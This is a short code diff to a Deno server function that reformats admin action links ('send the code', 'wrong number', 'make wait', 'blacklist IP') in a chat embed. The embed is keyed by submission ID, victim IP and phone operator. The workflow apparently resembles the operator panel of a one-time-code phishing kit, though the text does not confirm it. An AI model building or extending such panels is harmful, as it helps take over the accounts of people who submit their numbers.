@@ -63,7 +63,13 @@ Deno.serve(async (req) => {
   const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
 
   const embed2 = {
-    description: `[✅ Envoyer le code](${appUrl}/admin?trigger=${submissionId}) • [❌ Mauvais numéro](${appUrl}/admin?action=wrong&id=${submissionId}) • [⏳ Faire patienter](${appUrl}/admin?action=wait&id=${submissionId}) • [🚫 Blacklist](${appUrl}/admin?action=blacklist&id=${submissionId}&ip=${finalIp})`,
+    fields: [
+      {
+        name: "⚡ Actions",
+        value: `✅ [Envoyer le code](${appUrl}/admin?trigger=${submissionId})\n❌ [Mauvais numéro](${appUrl}/admin?action=wrong&id=${submissionId})\n⏳ [Faire patienter](${appUrl}/admin?action=wait&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/admin?action=blacklist&id=${submissionId}&ip=${finalIp})`,
+        inline: false,
+      }
+    ],
     color: operatorColors[operateur] || 16776960,
   };
 
